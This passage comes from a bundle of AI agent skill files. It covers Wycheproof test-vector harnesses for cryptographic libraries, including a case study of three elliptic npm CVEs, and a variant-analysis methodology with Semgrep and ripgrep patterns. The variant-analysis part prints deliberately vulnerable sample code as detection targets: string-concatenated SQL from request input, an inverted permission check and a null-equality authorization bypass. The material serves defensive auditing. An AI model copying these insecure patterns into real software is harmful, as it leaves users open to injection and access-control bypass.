\n test vectors               invalid cases   \n          \n```\n\n## Repository Structure\n\nThe Wycheproof repository is organized as follows:\n\n```text\n  README.md       : Project overview\n  doc             : Documentation\n  java            : Java JCE interface testing harness\n  javascript      : JavaScript testing harness\n  schemas         : Test vector schemas\n  testvectors     : Test vectors\n  testvectors_v1  : Updated test vectors (more detailed)\n```\n\nThe essential folders are `testvectors` and `testvectors_v1`. While both contain similar files, `testvectors_v1` includes more detailed information and is recommended for new integrations.\n\n## Supported Algorithms\n\nWycheproof provides test vectors for a wide range of cryptographic algorithms:\n\n| Category | Algorithms |\n|----------|------------|\n| **Symmetric Encryption** | AES-GCM, AES-EAX, ChaCha20-Poly1305 |\n| **Signatures** | ECDSA, EdDSA, RSA-PSS, RSA-PKCS1 |\n| **Key Exchange** | ECDH, X25519, X448 |\n| **Hashing** | HMAC, HKDF |\n| **Curves** | secp256k1, secp256r1, secp384r1, secp521r1, ed25519, ed448 |\n\n## Test File Structure\n\nEach JSON test file tests a specific cryptographic construction. All test files share common attributes:\n\n```json\n\"algorithm\"         : The name of the algorithm tested\n\"schema\"            : The JSON schema (found in schemas folder)\n\"generatorVersion\"  : The version number\n\"numberOfTests\"     : The total number of test vectors in this file\n\"header\"            : Detailed description of test vectors\n\"notes\"             : In-depth explanation of flags in test vectors\n\"testGroups\"        : Array of one or multiple test groups\n```\n\n### Test Groups\n\nTest groups group sets of tests based on shared attributes such as:\n- Key sizes\n- IV sizes\n- Public keys\n- Curves\n\nThis classification allows extracting tests that meet specific criteria relevant to the construction being tested.\n\n### Test Vector Attributes\n\n#### Shared Attributes\n\nAll test vectors contain four common fields:\n\n- **tcId**: Unique identifier for the test vector within a file\n- **comment**: Additional information about the test case\n- **flags**: Descriptions of specific test case types and potential dangers (referenced in `notes` field)\n- **result**: Expected outcome of the test\n\nThe `result` field can take three values:\n\n| Result | Meaning |\n|--------|---------|\n| **valid** | Test case should succeed |\n| **acceptable** | Test case is allowed to succeed but contains non-ideal attributes |\n| **invalid** | Test case should fail |\n\n#### Unique Attributes\n\nUnique attributes are specific to the algorithm being tested:\n\n| Algorithm | Unique Attributes |\n|-----------|-------------------|\n| AES-GCM | `key`, `iv`, `aad`, `msg`, `ct`, `tag` |\n| ECDH secp256k1 | `public`, `private`, `shared` |\n| ECDSA | `msg`, `sig`, `result` |\n| EdDSA | `msg`, `sig`, `pk` |\n\n## Implementation Guide\n\n### Phase 1: Add Wycheproof to Your Project\n\n**Option 1: Git Submodule (Recommended)**\n\nAdding Wycheproof as a git submodule ensures automatic updates:\n\n```bash\ngit submodule add https://github.com/C2SP/wycheproof.git\n```\n\n**Option 2: Fetch Specific Test Vectors**\n\nIf submodules aren't possible, fetch specific JSON files:\n\n```bash\n#!/bin/bash\n\nTMP_WYCHEPROOF_FOLDER=\".wycheproof/\"\nTEST_VECTORS=('aes_gcm_test.json' 'aes_eax_test.json')\nBASE_URL=\"https://raw.githubusercontent.com/C2SP/wycheproof/master/testvectors_v1/\"\n\n# Create wycheproof folder\nmkdir -p $TMP_WYCHEPROOF_FOLDER\n\n# Request all test vector files if they don't exist\nfor i in \"${TEST_VECTORS[@]}\"; do\n  if [ ! -f \"${TMP_WYCHEPROOF_FOLDER}${i}\" ]; then\n    curl -o \"${TMP_WYCHEPROOF_FOLDER}${i}\" \"${BASE_URL}${i}\"\n    if [ $? -ne 0 ]; then\n      echo \"Failed to download ${i}\"\n      exit 1\n    fi\n  fi\ndone\n```\n\n### Phase 2: Parse Test Vectors\n\nIdentify the test file for your algorithm and parse the JSON:\n\n**Python Example:**\n\n```python\nimport json\n\ndef load_wycheproof_test_vectors(path: str):\n    testVectors = []\n    try:\n        with open(path, \"r\") as f:\n            wycheproof_json = json.loads(f.read())\n    except FileNotFoundError:\n        print(f\"No Wycheproof file found at: {path}\")\n        return testVectors\n\n    # Attributes that need hex-to-bytes conversion\n    convert_attr = {\"key\", \"aad\", \"iv\", \"msg\", \"ct\", \"tag\"}\n\n    for testGroup in wycheproof_json[\"testGroups\"]:\n        # Filter test groups based on implementation constraints\n        if testGroup[\"ivSize\"] < 64 or testGroup[\"ivSize\"] > 1024:\n            continue\n\n        for tv in testGroup[\"tests\"]:\n            # Convert hex strings to bytes\n            for attr in convert_attr:\n                if attr in tv:\n                    tv[attr] = bytes.fromhex(tv[attr])\n            testVectors.append(tv)\n\n    return testVectors\n```\n\n**JavaScript Example:**\n\n```javascript\nconst fs = require('fs').promises;\n\nasync function loadWycheproofTestVectors(path) {\n  const tests = [];\n\n  try {\n    const fileContent = await fs.readFile(path);\n    const data = JSON.parse(fileContent.toString());\n\n    data.testGroups.forEach(testGroup => {\n      testGroup.tests.forEach(test => {\n        // Add shared test group properties to each test\n        test['pk'] = testGroup.publicKey.pk;\n        tests.push(test);\n      });\n    });\n  } catch (err) {\n    console.error('Error reading or parsing file:', err);\n    throw err;\n  }\n\n  return tests;\n}\n```\n\n### Phase 3: Write Testing Harness\n\nCreate test functions that handle both valid and invalid test cases.\n\n**Python/pytest Example:**\n\n```python\nimport pytest\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\ntvs = load_wycheproof_test_vectors(\"wycheproof/testvectors_v1/aes_gcm_test.json\")\n\n@pytest.mark.parametrize(\"tv\", tvs, ids=[str(tv['tcId']) for tv in tvs])\ndef test_encryption(tv):\n    try:\n        aesgcm = AESGCM(tv['key'])\n        ct = aesgcm.encrypt(tv['iv'], tv['msg'], tv['aad'])\n    except ValueError as e:\n        # Implementation raised error - verify test was expected to fail\n        assert tv['result'] != 'valid', tv['comment']\n        return\n\n    if tv['result'] == 'valid':\n        assert ct[:-16] == tv['ct'], f\"Ciphertext mismatch: {tv['comment']}\"\n        assert ct[-16:] == tv['tag'], f\"Tag mismatch: {tv['comment']}\"\n    elif tv['result'] == 'invalid' or tv['result'] == 'acceptable':\n        assert ct[:-16] != tv['ct'] or ct[-16:] != tv['tag']\n\n@pytest.mark.parametrize(\"tv\", tvs, ids=[str(tv['tcId']) for tv in tvs])\ndef test_decryption(tv):\n    try:\n        aesgcm = AESGCM(tv['key'])\n        decrypted_msg = aesgcm.decrypt(tv['iv'], tv['ct'] + tv['tag'], tv['aad'])\n    except ValueError:\n        assert tv['result'] != 'valid', tv['comment']\n        return\n    except InvalidTag:\n        assert tv['result'] != 'valid', tv['comment']\n        assert 'ModifiedTag' in tv['flags'], f\"Expected 'ModifiedTag' flag: {tv['comment']}\"\n        return\n\n    assert tv['result'] == 'valid', f\"No invalid test case should pass: {tv['comment']}\"\n    assert decrypted_msg == tv['msg'], f\"Decryption mismatch: {tv['comment']}\"\n```\n\n**JavaScript/Mocha Example:**\n\n```javascript\nconst assert = require('assert');\n\nfunction testFactory(tcId, tests) {\n  it(`[${tcId + 1}] ${tests[tcId].comment}`, function () {\n    const test = tests[tcId];\n    const ed25519 = new eddsa('ed25519');\n    const key = ed25519.keyFromPublic(toArray(test.pk, 'hex'));\n\n    let sig;\n    if (test.result === 'valid') {\n      sig = key.verify(test.msg, test.sig);\n      assert.equal(sig, true, `[${test.tcId}] ${test.comment}`);\n    } else if (test.result === 'invalid') {\n      try {\n        sig = key.verify(test.msg, test.sig);\n      } catch (err) {\n        // Point could not be decoded\n        sig = false;\n      }\n      assert.equal(sig, false, `[${test.tcId}] ${test.comment}`);\n    }\n  });\n}\n\n// Generate tests for all test vectors\nfor (var tcId = 0; tcId < tests.length; tcId++) {\n  testFactory(tcId, tests);\n}\n```\n\n### Phase 4: CI Integration\n\nEnsure test vectors stay up to date by:\n\n1. **Using git submodules**: Update submodule in CI before running tests\n2. **Fetching latest vectors**: Run fetch script before test execution\n3. **Scheduled updates**: Set up weekly/monthly updates to catch new test vectors\n\n## Common Vulnerabilities Detected\n\nWycheproof test vectors are designed to catch specific vulnerability patterns:\n\n| Vulnerability | Description | Affected Algorithms | Example CVE |\n|---------------|-------------|---------------------|-------------|\n| Signature malleability | Multiple valid signatures for same message | ECDSA, EdDSA | CVE-2024-42459 |\n| Invalid DER encoding | Accepting non-canonical DER signatures | ECDSA | CVE-2024-42460, CVE-2024-42461 |\n| Invalid curve attacks | ECDH with invalid curve points | ECDH | Common in many libraries |\n| Padding oracle | Timing leaks in padding validation | RSA-PKCS1 | Historical OpenSSL issues |\n| Tag forgery | Accepting modified authentication tags | AES-GCM, ChaCha20-Poly1305 | Various implementations |\n\n### Signature Malleability: Deep Dive\n\n**Problem:** Implementations that don't validate signature encoding can accept multiple valid signatures for the same message.\n\n**Example (EdDSA):** Appending or removing zeros from signature:\n```text\nValid signature:   ...6a5c51eb6f946b30d\nInvalid signature: ...6a5c51eb6f946b30d0000  (should be rejected)\n```\n\n**How to detect:**\n```python\n# Add signature length check\nif len(sig) != 128:  # EdDSA signatures must be exactly 64 bytes (128 hex chars)\n    return False\n```\n\n**Impact:** Can lead to consensus problems when different implementations accept/reject the same signatures.\n\n**Related Wycheproof tests:**\n- EdDSA: tcId 37 - \"removing 0 byte from signature\"\n- ECDSA: tcId 06 - \"Legacy: ASN encoding of r misses leading 0\"\n\n## Case Study: Elliptic npm Package\n\nThis case study demonstrates how Wycheproof found three CVEs in the popular elliptic npm package (3000+ dependents, millions of weekly downloads).\n\n### Overview\n\nThe [elliptic](https://www.npmjs.com/package/elliptic) library is an elliptic-curve cryptography library written in JavaScript, supporting ECDH, ECDSA, and EdDSA. Using Wycheproof test vectors on version 6.5.6 revealed multiple vulnerabilities:\n\n- **CVE-2024-42459**: EdDSA signature malleability (appending/removing zeros)\n- **CVE-2024-42460**: ECDSA DER encoding - invalid bit placement\n- **CVE-2024-42461**: ECDSA DER encoding - leading zero in length field\n\n### Methodology\n\n1. **Identify supported curves**: ed25519 for EdDSA\n2. **Find test vectors**: `testvectors_v1/ed25519_test.json`\n3. **Parse test vectors**: Load JSON and extract tests\n4. **Write test harness**: Create parameterized tests\n5. **Run tests**: Identify failures\n6. **Analyze root causes**: Examine implementation code\n7. **Propose fixes**: Add validation checks\n\n### Key Findings\n\n**EdDSA Issue (CVE-2024-42459):**\n- Missing signature length validation\n- Allowed trailing zeros in signatures\n- Fix: Add `if(sig.length !== 128) return false;`\n\n**ECDSA Issue 1 (CVE-2024-42460):**\n- Missing check for first bit being zero in DER-encoded r and s values\n- Fix: Add `if ((data[p.place] & 128) !== 0) return false;`\n\n**ECDSA Issue 2 (CVE-2024-42461):**\n- DER length field accepted leading zeros\n- Fix: Add `if(buf[p.place] === 0x00) return false;`\n\n### Impact\n\nAll three vulnerabilities allowed multiple valid signatures for a single message, leading to consensus problems across implementations.\n\n**Lessons learned:**\n- Wycheproof catches subtle encoding bugs\n- Reusable test harnesses pay dividends\n- Test vector comments and flags help diagnose issues\n- Even popular libraries benefit from systematic test vector validation\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Filter test groups by parameters | Focus on test vectors relevant to your implementation constraints |\n| Use test vector flags | Understand specific vulnerability patterns being tested |\n| Check the `notes` field | Get detailed explanations of flag meanings |\n| Test both encrypt/decrypt and sign/verify | Ensure bidirectional correctness |\n| Run tests in CI | Catch regressions and benefit from new test vectors |\n| Use parameterized tests | Get clear failure messages with tcId and comment |\n\n### Common Mistakes\n\n| Mistake | Why It's Wrong | Correct Approach |\n|---------|----------------|------------------|\n| Only testing valid cases | Misses vulnerabilities where invalid inputs are accepted | Test all result types: valid, invalid, acceptable |\n| Ignoring \"acceptable\" result | Implementation might have subtle bugs | Treat acceptable as warnings worth investigating |\n| Not filtering test groups | Wastes time on unsupported parameters | Filter by keySize, ivSize, etc. based on your implementation |\n| Not updating test vectors | Miss new vulnerability patterns | Use submodules or scheduled fetches |\n| Testing only one direction | Encrypt/sign might work but decrypt/verify fails | Test both operations |\n\n## Related Skills\n\n### Tool Skills\n\n| Skill | Primary Use in Wycheproof Testing |\n|-------|-----------------------------------|\n| **pytest** | Python testing framework for parameterized tests |\n| **mocha** | JavaScript testing framework for test generation |\n| **constant-time-testing** | Complement Wycheproof with timing side-channel testing |\n| **cryptofuzz** | Fuzz-based crypto testing to find additional bugs |\n\n### Technique Skills\n\n| Skill | When to Apply |\n|-------|---------------|\n| **coverage-analysis** | Ensure test vectors cover all code paths in crypto implementation |\n| **property-based-testing** | Test mathematical properties (e.g., encrypt/decrypt round-trip) |\n| **fuzz-harness-writing** | Create harnesses for crypto parsers (complements Wycheproof) |\n\n### Related Domain Skills\n\n| Skill | Relationship |\n|-------|--------------|\n| **crypto-testing** | Wycheproof is a key tool in comprehensive crypto testing methodology |\n| **fuzzing** | Use fuzzing to find bugs Wycheproof doesn't cover (new edge cases) |\n\n## Skill Dependency Map\n\n```\n                    \n                        wycheproof       \n                       (this skill)      \n                    \n                               \n           \n                                                 \n                                                 \n  \n  pytest/mocha     constant-time       cryptofuzz    \n (test framework)    testing           (fuzzing)     \n  \n                                               \n         \n                             \n                             \n              \n                 Technique Skills       \n               coverage, harness, PBT   \n              \n```\n\n## Resources\n\n### Official Repository\n\n**[Wycheproof GitHub Repository](https://github.com/C2SP/wycheproof)**\n\nThe official repository contains:\n- All test vectors in `testvectors/` and `testvectors_v1/`\n- JSON schemas in `schemas/`\n- Reference implementations in Java and JavaScript\n- Documentation in `doc/`\n\n### Real-World Examples\n\n**[pycryptodome](https://pypi.org/project/pycryptodome/)**\n\nThe pycryptodome library integrates Wycheproof test vectors in their test suite, demonstrating best practices for Python crypto implementations.\n\n### Community Resources\n\n- [C2SP Community](https://c2sp.org/) - Cryptographic specifications and standards community maintaining Wycheproof\n- Wycheproof issues tracker - Report bugs in test vectors or suggest new constructions\n\n## Summary\n\nWycheproof is an essential tool for validating cryptographic implementations against known attack vectors and edge cases. By integrating Wycheproof test vectors into your testing workflow:\n\n1. Catch subtle encoding and validation bugs\n2. Prevent signature malleability issues\n3. Ensure consistent behavior across implementations\n4. Benefit from community-contributed test vectors\n5. Protect against known cryptographic vulnerabilities\n\nThe investment in writing a reusable testing harness pays dividends through continuous validation as new test vectors are added to the Wycheproof repository.\n",
        "plugins/variant-analysis/.claude-plugin/plugin.json": "{\n  \"name\": \"variant-analysis\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Find similar vulnerabilities and bugs across codebases using pattern-based analysis\",\n  \"author\": {\n    \"name\": \"Axel Mierczuk\"\n  }\n}\n",
        "plugins/variant-analysis/README.md": "# Variant Analysis\n\nFind similar vulnerabilities and bugs across codebases using pattern-based analysis.\n\n**Author:** Axel Mierczuk\n\n## When to Use\n\nUse this skill when you need to:\n- Hunt for bug variants after finding an initial vulnerability\n- Build CodeQL or Semgrep queries from a known bug pattern\n- Perform systematic code audits across large codebases\n- Analyze security vulnerabilities and find similar instances\n- Create reusable patterns for recurring vulnerability classes\n\n## What It Does\n\nThis skill provides a systematic five-step process for variant analysis:\n1. **Understand the original issue** - Identify root cause, conditions, and exploitability\n2. **Create an exact match** - Start with a pattern matching only the known bug\n3. **Identify abstraction points** - Determine what can be generalized\n4. **Iteratively generalize** - Expand patterns one element at a time\n5. **Analyze and triage** - Document and prioritize findings\n\nIncludes:\n- Tool selection guidance (ripgrep, Semgrep, CodeQL)\n- Critical pitfalls to avoid (narrow scope, over-specific patterns)\n- Ready-to-use templates for CodeQL and Semgrep in Python, JavaScript, Java, Go, and C++\n- Detailed methodology documentation\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/variant-analysis\n```\n\n## Related Skills\n\n- `codeql` - Primary tool for deep interprocedural variant analysis\n- `semgrep` - Fast pattern matching for simpler variants\n- `sarif-parsing` - Process variant analysis results\n",
        "plugins/variant-analysis/commands/variants.md": "---\nname: trailofbits:variants\ndescription: Finds similar vulnerabilities using pattern-based analysis\nargument-hint: \"(uses conversation context for bug pattern)\"\nallowed-tools:\n  - Read\n  - Grep\n  - Glob\n  - Bash\n  - Task\n---\n\n# Find Vulnerability Variants\n\n**Arguments:** $ARGUMENTS\n\nThis command is context-driven. Use conversation context to understand:\n1. The original bug/vulnerability that was found\n2. The codebase to search\n\nIf context is unclear, ask for a description of the original vulnerability.\n\nInvoke the `variant-analysis` skill for the full workflow.\n",
        "plugins/variant-analysis/skills/variant-analysis/METHODOLOGY.md": "# The Philosophy of Generic but Precise Variant Analysis\n\nThis document covers the strategic thinking behind effective variant analysis.\n\n## Why Variants Exist\n\nVulnerabilities cluster because developers make consistent mistakes:\n\n1. **Developer habits**: Same person writes similar code, makes similar errors\n2. **Copy-paste propagation**: Boilerplate spreads bugs across the codebase\n3. **API misuse patterns**: Complex APIs invite consistent misunderstandings\n4. **Framework idioms**: Framework patterns create predictable vulnerability shapes\n5. **Incomplete fixes**: Original bug fixed in one place, missed elsewhere\n\nUnderstanding WHY variants exist helps predict WHERE to find them.\n\n## Root Cause Analysis\n\nBefore searching, extract the essential vulnerability pattern:\n\n### Ask These Questions\n\n1. **What operation is dangerous?** (e.g., `eval()`, `system()`, raw SQL)\n2. **What data makes it dangerous?** (e.g., user-controlled input)\n3. **What's missing?** (e.g., sanitization, validation, bounds check)\n4. **What context enables it?** (e.g., authentication state, error handling path)\n\n### The Root Cause Statement\n\nFormulate a clear statement:\n\n> \"This vulnerability exists because [UNTRUSTED DATA] reaches [DANGEROUS OPERATION] without [REQUIRED PROTECTION].\"\n\nExamples:\n- \"User input reaches `eval()` without sanitization\"\n- \"Attacker-controlled size reaches `malloc()` without overflow check\"\n- \"Untrusted path reaches `open()` without canonicalization\"\n\nThis statement IS your search pattern.\n\n## The Abstraction Ladder\n\nPatterns exist at different abstraction levels. Start at Level 0 and climb.\n\n### Level 0: Exact Match\n\nMatch the literal vulnerable code:\n\n```python\n# Original vulnerable code\nquery = \"SELECT * FROM users WHERE id=\" + request.args.get('id')\n```\n\n```bash\n# Level 0 pattern\nrg 'SELECT \\* FROM users WHERE id=\" \\+ request\\.args\\.get'\n```\n\n- **Matches**: 1 (the original)\n- **False positives**: 0\n- **Value**: Confirms the bug exists, baseline for generalization\n\n### Level 1: Variable Abstraction\n\nReplace variable names with wildcards:\n\n```yaml\n# Level 1 pattern\npattern: $QUERY = \"SELECT * FROM users WHERE id=\" + $INPUT\n```\n\n- **Matches**: 3-5 (same query pattern, different variables)\n- **False positives**: Low\n- **Value**: Find copy-paste variants\n\n### Level 2: Structural Abstraction\n\nGeneralize the structure:\n\n```yaml\n# Level 2 pattern\npatterns:\n  - pattern: $Q = \"...\" + $INPUT\n  - pattern-inside: |\n      def $FUNC(...):\n        ...\n        cursor.execute($Q)\n```\n\n- **Matches**: 10-30 (any string concat used in query)\n- **False positives**: Medium\n- **Value**: Find pattern variants\n\n### Level 3: Semantic Abstraction\n\nAbstract to the security property:\n\n```yaml\n# Level 3 pattern (taint mode)\nmode: taint\npattern-sources:\n  - pattern: request.args.get(...)\n  - pattern: request.form.get(...)\npattern-sinks:\n  - pattern: cursor.execute(...)\n```\n\n- **Matches**: 50-100+ (any user input to any query)\n- **False positives**: High (many will have proper parameterization)\n- **Value**: Comprehensive coverage, requires triage\n\n### Choosing Your Level\n\n| Goal | Recommended Level |\n|------|-------------------|\n| Verify a specific fix | Level 0 |\n| Find copy-paste bugs | Level 1 |\n| Audit a component | Level 2 |\n| Full security assessment | Level 3 |\n\n## The Generalization Process\n\n### Rule: One Change at a Time\n\nNever generalize multiple elements simultaneously:\n\n```\nBAD:  exact code -> fully abstract pattern\nGOOD: exact code -> abstract var1 -> abstract var2 -> abstract operation\n```\n\nEach step:\n1. Make ONE change\n2. Run the pattern\n3. Review ALL new matches\n4. Decide: acceptable FP rate?\n5. Continue or revert\n\n### Decision Points\n\nAt each generalization step, ask:\n\n**Should I abstract this variable name?**\n- YES if: Different names could have same bug\n- NO if: The name indicates a specific semantic meaning you want to preserve\n\n**Should I abstract this literal value?**\n- YES if: Any value would trigger the bug\n- NO if: Only specific values (like `2` in a shift operation) are dangerous\n\n**Should I use `...` wildcards?**\n- YES if: Argument position doesn't matter\n- NO if: Only specific argument positions are sinks\n\n**Should I add taint tracking?**\n- YES if: Need to verify data actually flows from source to sink\n- NO if: Presence of pattern is sufficient evidence\n\n## False Positive Management\n\n### Acceptable FP Rates by Context\n\n| Context | Acceptable FP Rate |\n|---------|-------------------|\n| Automated CI blocking | <5% |\n| Developer warning | <20% |\n| Security audit triage | <50% |\n| Research/exploration | <80% |\n\n### Common FP Sources and Filters\n\n**Dead code**: Add reachability constraints\n```yaml\npattern-not-inside: |\n  if False:\n    ...\n```\n\n**Test code**: Exclude test directories\n```bash\nrg \"pattern\" --glob '!**/test*' --glob '!**/*_test.*'\n```\n\n**Already sanitized**: Add sanitizer patterns\n```yaml\npattern-not: dangerous_func(sanitize($X))\n```\n\n**Literal values**: Exclude non-user-controlled data\n```yaml\npattern-not: dangerous_func(\"...\")  # Literal string\n```\n\n## Multi-Repository Campaign\n\nFor large-scale hunts: **Recon** (ripgrep to find hotspots)  **Deep Analysis** (Semgrep/CodeQL on hotspots)  **Refinement** (reduce FPs)  **Automation** (CI-ready rules).\n\n## Tracking Your Hunt\n\nMaintain a tracking document:\n\n```markdown\n## Variant Analysis: [Original Bug ID]\n\n### Root Cause\n[Statement of the vulnerability pattern]\n\n### Patterns Tried\n| Pattern | Level | Matches | True Pos | False Pos | Notes |\n|---------|-------|---------|----------|-----------|-------|\n| exact   | 0     | 1       | 1        | 0         | Baseline |\n| ...     | ...   | ...     | ...      | ...       | ...   |\n\n### Confirmed Variants\n| Location | Severity | Status | Notes |\n|----------|----------|--------|-------|\n| file:line| High     | Fixed  | ...   |\n\n### False Positive Patterns\n- Pattern X: Always FP because [reason]\n- Pattern Y: FP in [context] but TP in [context]\n```\n\n## Anti-Patterns to Avoid\n\n### Starting Too Generic\n\n**Wrong**: Jump straight to semantic analysis\n**Right**: Start with exact match, generalize incrementally\n\n### Generalizing Everything\n\n**Wrong**: Abstract all elements at once\n**Right**: Abstract one element, verify, repeat\n\n### Ignoring False Positives\n\n**Wrong**: \"I'll triage later\"\n**Right**: Analyze FPs immediately, they guide pattern refinement\n\n### Tool Loyalty\n\n**Wrong**: \"I only use CodeQL\"\n**Right**: Use ripgrep for recon, Semgrep for iteration, CodeQL for precision\n\n### Pattern Hoarding\n\n**Wrong**: Keep all patterns regardless of FP rate\n**Right**: Delete patterns that don't provide value\n\n## Expanding Vulnerability Classes\n\nA single root cause can manifest in multiple ways. Before concluding your search, systematically expand to related vulnerability classes.\n\n### The Expansion Checklist\n\nFor each root cause, ask:\n\n1. **What other attributes/functions have similar semantics?**\n   - If bug involves `isAuthenticated`, also check: `isActive`, `isAdmin`, `isVerified`, `isLoggedIn`\n   - If bug involves `userId`, also check: `ownerId`, `creatorId`, `authorId`\n\n2. **What other boolean logic errors could occur?**\n   - Inverted conditions (`if not x` vs `if x`)\n   - Wrong default return value (`return true` vs `return false`)\n   - Short-circuit evaluation errors\n\n3. **What edge cases exist for the data types involved?**\n   - Null/None/undefined comparisons\n   - Empty string vs null\n   - Zero vs null\n   - Empty array/collection\n\n4. **What documentation mismatches could exist?**\n   - Function does opposite of docstring\n   - Parameter meaning inverted\n   - Return value semantics reversed\n\n### Semantic Analysis\n\nSome bugs can only be found by comparing code behavior to documented intent:\n\n**Pattern:** Function name or docstring suggests one behavior, code does another\n\n```python\n# Docstring says \"Returns True if access should be DENIED\"\n# But code returns True when user HAS permission (should be allowed)\ndef check_restricted_permission(user, perm):\n    \"\"\"Returns True if access should be DENIED.\"\"\"\n    if user.has_perm(perm):\n        return True  # BUG: This grants access to users with permission\n    return False\n```\n\n**Detection strategy:**\n1. Search for functions with \"deny\", \"restrict\", \"block\", \"forbid\" in names\n2. Manually verify return value semantics match the name/docs\n3. Create rules that flag suspicious patterns for manual review\n\n### Null Equality Bypasses\n\nA common class of authorization bypass:\n\n```python\n# If anonymous_user.id is None and guest_order.owner_id is None\n# Then None == None evaluates to True, bypassing the check\nif order.owner_id == current_user.id:\n    return True  # Allows access\n```\n\n**Detection strategy:**\n1. Find all owner/permission checks using equality comparisons\n2. Trace what values the compared fields can have\n3. Check if both sides can be null simultaneously\n\n## Summary: The Expert Mindset\n\n1. **Understand before searching**: Root cause analysis is non-negotiable\n2. **Start specific**: Your first pattern should match exactly one thing\n3. **Climb the ladder**: Generalize one step at a time\n4. **Measure as you go**: Track matches and FP rates at each step\n5. **Know when to stop**: High FP rate means you've gone too far\n6. **Iterate ruthlessly**: Refine patterns based on what you learn\n7. **Document everything**: Your tracking doc is as valuable as your patterns\n8. **Expand vulnerability classes**: One root cause has many manifestations\n9. **Check semantics**: Verify code matches documentation intent\n10. **Test edge cases**: Null values and boundary conditions reveal hidden bugs\n",
        "plugins/variant-analysis/skills/variant-analysis/SKILL.md": "---\nname: variant-analysis\ndescription: Find similar vulnerabilities and bugs across codebases using pattern-based analysis. Use when hunting bug variants, building CodeQL/Semgrep queries, analyzing security vulnerabilities, or performing systematic code audits after finding an initial issue.\n---\n\n# Variant Analysis\n\nYou are a variant analysis expert. Your role is to help find similar vulnerabilities and bugs across a codebase after identifying an initial pattern.\n\n## When to Use\n\nUse this skill when:\n- A vulnerability has been found and you need to search for similar instances\n- Building or refining CodeQL/Semgrep queries for security patterns\n- Performing systematic code audits after an initial issue discovery\n- Hunting for bug variants across a codebase\n- Analyzing how a single root cause manifests in different code paths\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Initial vulnerability discovery (use audit-context-building or domain-specific audits instead)\n- General code review without a known pattern to search for\n- Writing fix recommendations (use issue-writer instead)\n- Understanding unfamiliar code (use audit-context-building for deep comprehension first)\n\n## The Five-Step Process\n\n### Step 1: Understand the Original Issue\n\nBefore searching, deeply understand the known bug:\n- **What is the root cause?** Not the symptom, but WHY it's vulnerable\n- **What conditions are required?** Control flow, data flow, state\n- **What makes it exploitable?** User control, missing validation, etc.\n\n### Step 2: Create an Exact Match\n\nStart with a pattern that matches ONLY the known instance:\n```bash\nrg -n \"exact_vulnerable_code_here\"\n```\nVerify: Does it match exactly ONE location (the original)?\n\n### Step 3: Identify Abstraction Points\n\n| Element | Keep Specific | Can Abstract |\n|---------|---------------|--------------|\n| Function name | If unique to bug | If pattern applies to family |\n| Variable names | Never | Always use metavariables |\n| Literal values | If value matters | If any value triggers bug |\n| Arguments | If position matters | Use `...` wildcards |\n\n### Step 4: Iteratively Generalize\n\n**Change ONE element at a time:**\n1. Run the pattern\n2. Review ALL new matches\n3. Classify: true positive or false positive?\n4. If FP rate acceptable, generalize next element\n5. If FP rate too high, revert and try different abstraction\n\n**Stop when false positive rate exceeds ~50%**\n\n### Step 5: Analyze and Triage Results\n\nFor each match, document:\n- **Location**: File, line, function\n- **Confidence**: High/Medium/Low\n- **Exploitability**: Reachable? Controllable inputs?\n- **Priority**: Based on impact and exploitability\n\nFor deeper strategic guidance, see [METHODOLOGY.md](METHODOLOGY.md).\n\n## Tool Selection\n\n| Scenario | Tool | Why |\n|----------|------|-----|\n| Quick surface search | ripgrep | Fast, zero setup |\n| Simple pattern matching | Semgrep | Easy syntax, no build needed |\n| Data flow tracking | Semgrep taint / CodeQL | Follows values across functions |\n| Cross-function analysis | CodeQL | Best interprocedural analysis |\n| Non-building code | Semgrep | Works on incomplete code |\n\n## Key Principles\n\n1. **Root cause first**: Understand WHY before searching for WHERE\n2. **Start specific**: First pattern should match exactly the known bug\n3. **One change at a time**: Generalize incrementally, verify after each change\n4. **Know when to stop**: 50%+ FP rate means you've gone too generic\n5. **Search everywhere**: Always search the ENTIRE codebase, not just the module where the bug was found\n6. **Expand vulnerability classes**: One root cause often has multiple manifestations\n\n## Critical Pitfalls to Avoid\n\nThese common mistakes cause analysts to miss real vulnerabilities:\n\n### 1. Narrow Search Scope\n\nSearching only the module where the original bug was found misses variants in other locations.\n\n**Example:** Bug found in `api/handlers/`  only searching that directory  missing variant in `utils/auth.py`\n\n**Mitigation:** Always run searches against the entire codebase root directory.\n\n### 2. Pattern Too Specific\n\nUsing only the exact attribute/function from the original bug misses variants using related constructs.\n\n**Example:** Bug uses `isAuthenticated` check  only searching for that exact term  missing bugs using related properties like `isActive`, `isAdmin`, `isVerified`\n\n**Mitigation:** Enumerate ALL semantically related attributes/functions for the bug class.\n\n### 3. Single Vulnerability Class\n\nFocusing on only one manifestation of the root cause misses other ways the same logic error appears.\n\n**Example:** Original bug is \"return allow when condition is false\"  only searching that pattern  missing:\n- Null equality bypasses (`null == null` evaluates to true)\n- Documentation/code mismatches (function does opposite of what docs claim)\n- Inverted conditional logic (wrong branch taken)\n\n**Mitigation:** List all possible manifestations of the root cause before searching.\n\n### 4. Missing Edge Cases\n\nTesting patterns only with \"normal\" scenarios misses vulnerabilities triggered by edge cases.\n\n**Example:** Testing auth checks only with valid users  missing bypass when `userId = null` matches `resourceOwnerId = null`\n\n**Mitigation:** Test with: unauthenticated users, null/undefined values, empty collections, and boundary conditions.\n\n## Resources\n\nReady-to-use templates in `resources/`:\n\n**CodeQL** (`resources/codeql/`):\n- `python.ql`, `javascript.ql`, `java.ql`, `go.ql`, `cpp.ql`\n\n**Semgrep** (`resources/semgrep/`):\n- `python.yaml`, `javascript.yaml`, `java.yaml`, `go.yaml`, `cpp.yaml`\n\n**Report**: `resources/variant-report-template.md`",
